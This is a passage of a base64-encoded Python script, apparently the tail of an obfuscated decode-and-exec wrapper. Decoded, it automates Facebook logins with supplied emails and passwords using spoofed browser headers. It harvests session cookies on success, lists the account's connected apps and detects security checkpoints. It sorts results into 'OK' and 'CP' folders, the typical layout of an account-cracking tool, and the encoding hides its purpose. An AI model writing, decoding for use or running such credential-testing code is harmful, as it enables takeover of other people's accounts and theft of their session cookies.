lbnQtdHlwZSI6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLCJ1c2VyLWFnZW50IjogdWEsImFjY2VwdCI6ICJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwieC1yZXF1ZXN0ZWQtd2l0aCI6ICJtYXJrLnZpYS5ncCIsInNlYy1mZXRjaC1zaXRlIjogInNhbWUtb3JpZ2luIiwic2VjLWZldGNoLW1vZGUiOiAibmF2aWdhdGUiLCJzZWMtZmV0Y2gtdXNlciI6ICI/MSIsInNlYy1mZXRjaC1kZXN0IjogImRvY3VtZW50IiwicmVmZXJlciI6IG1iKyIvbG9naW4vP25leHQmcmVmPWRibCZmbCZyZWZpZD04IiwiYWNjZXB0LWVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLCJhY2NlcHQtbGFuZ3VhZ2UiOiAiaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjcifSkKCWRhdGEgPSB7fQoJZ2VkID0gcGFyc2VyKHNlcy5nZXQobWIrIi9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiLCBoZWFkZXJzPXsidXNlci1hZ2VudCI6dWF9KS50ZXh0LCAiaHRtbC5wYXJzZXIiKQoJZm0gPSBnZWQuZmluZCgiZm9ybSIseyJtZXRob2QiOiJwb3N0In0pCglsaXN0ID0gWyJsc2QiLCJqYXpvZXN0IiwibV90cyIsImxpIiwidHJ5X251bWJlciIsInVucmVjb2duaXplZF90cmllcyIsImxvZ2luIiwiYmlfeHJ3aCJdCglmb3IgaSBpbiBmbS5maW5kX2FsbCgiaW5wdXQiKToKCQlpZiBpLmdldCgibmFtZSIpIGluIGxpc3Q6CgkJCWRhdGEudXBkYXRlKHtpLmdldCgibmFtZSIpOmkuZ2V0KCJ2YWx1ZSIpfSkKCQllbHNlOgoJCQljb250aW51ZQoJZGF0YS51cGRhdGUoeyJlbWFpbCI6dXNlciwicGFzcyI6cGFzd30pCglydW4gPSBwYXJzZXIoc2VzLnBvc3QobWIrZm0uZ2V0KCJhY3Rpb24iKSwgZGF0YT1kYXRhLCBhbGxvd19yZWRpcmVjdHM9VHJ1ZSkudGV4dCwgImh0bWwucGFyc2VyIikKCWlmICJjX3VzZXIiIGluIHNlcy5jb29raWVzOgoJCWt1a2kgPSAoIjsiKS5qb2luKFsgIiVzPSVzIiAlIChrZXksIHZhbHVlKSBmb3Iga2V5LCB2YWx1ZSBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCkgXSkKCQlydW4gPSBwYXJzZXIoc2VzLmdldCgiaHR0cHM6Ly9mcmVlLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8iLCBjb29raWVzPXsiY29va2llIjprdWtpfSkudGV4dCwgImh0bWwucGFyc2VyIikKCQl4ZSA9IFtyZS5maW5kYWxsKCJcPHNwYW4uKj9ocmVmPVwiLio/XCI+KC4qPyk8XC9hPjxcL3NwYW4+Lio/XDxkaXYgY2xhc3M9XCIuKj9cIj4oLio/KTxcL2Rpdj4iLCBzdHIodGQpKSBmb3IgdGQgaW4gcnVuLmZpbmRfYWxsKCJ0ZCIsIHsiYXJpYS1oaWRkZW4iOiJmYWxzZSJ9KV1bMjpdCgkJcHJpbnQoIiBbK10gYXBsaWthc2kgdGVyaHVidW5nIGFkYSA6ICIrc3RyKGxlbih4ZSkpKQoJCW51bSA9IDAKCQlmb3IgXyBpbiB4ZToKCQkJbnVtICs9IDEKCQkJcHJpbnQoIiAgICIrc3RyKG51bSkrIiAiK19bMF1bMF0rIiwgIitfWzBdWzFdKQoJZWxpZiAiY2hlY2twb2ludCIgaW4gc2VzLmNvb2tpZXM6CgkJZm9ybSA9IHJ1bi5maW5kKCJmb3JtIikKCQlkdHNnID0gZm9ybS5maW5kKCJpbnB1dCIseyJuYW1lIjoiZmJfZHRzZyJ9KVsidmFsdWUiXQoJCWp6c3QgPSBmb3JtLmZpbmQoImlucHV0Iix7Im5hbWUiOiJqYXpvZXN0In0pWyJ2YWx1ZSJdCgkJbmggICA9IGZvcm0uZmluZCgiaW5wdXQiLHsibmFtZSI6Im5oIn0pWyJ2YWx1ZSJdCgkJZGF0YUQgPSB7ImZiX2R0c2ciOiBkdHNnLCJmYl9kdHNnIjogZHRzZywiamF6b2VzdCI6IGp6c3QsImphem9lc3QiOiBqenN0LCJjaGVja3BvaW50X2RhdGEiOiIiLCJzdWJtaXRbQ29udGludWVdIjoiTGFuanV0a2FuIiwibmgiOiBuaH0KCQl4bnh4ID0gcGFyc2VyKHNlcy5wb3N0KG1iK2Zvcm1bImFjdGlvbiJdLCBkYXRhPWRhdGFEKS50ZXh0LCAiaHRtbC5wYXJzZXIiKQoJCW5nZXcgPSBbeXkudGV4dCBmb3IgeXkgaW4geG54eC5maW5kX2FsbCgib3B0aW9uIildCgkJcHJpbnQoIiBbK10gdGVyZGFwYXQgIitzdHIobGVuKG5nZXcpKSsiIG9wc2kgIikKCQlmb3Igb3B0IGluIHJhbmdlKGxlbihuZ2V3KSk6CgkJCXByaW50KCIgWyIrc3RyKG9wdCsxKSsiXSAiK25nZXdbb3B0XSkKCWVsaWYgImxvZ2luX2Vycm9yIiBpbiBzdHIocnVuKToKCQlvaCA9IHJ1bi5maW5kKCJkaXYiLHsiaWQiOiJsb2dpbl9lcnJvciJ9KS5maW5kKCJkaXYiKS50ZXh0CgkJcHJpbnQoIiBbIV0gJXMiJShvaCkpCgllbHNlOgoJCXByaW50KCIgWyFdIExvZ2luIEZhaWxlZCwgUGxlYXNlIENoZWNrIFlvdXIgSWQgQW5kIFBhc3N3b3JkIEFnYWluIikKCQpkZWYgYnVhdF9mb2xkZXIoKToKCXRyeTpvcy5ta2RpcigiQ1AiKQoJZXhjZXB0OnBhc3MKCXRyeTpvcy5ta2RpcigiT0siKQoJZXhjZXB0OnBhc3MKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6Cglvcy5zeXN0ZW0oImdpdCBwdWxsIikKCW9zLnN5c3RlbSgidG91Y2ggbG9naW4udHh0IikKCWJ1YXRfZm9sZGVyKCkKCWxvZ2luKCkKCg=='))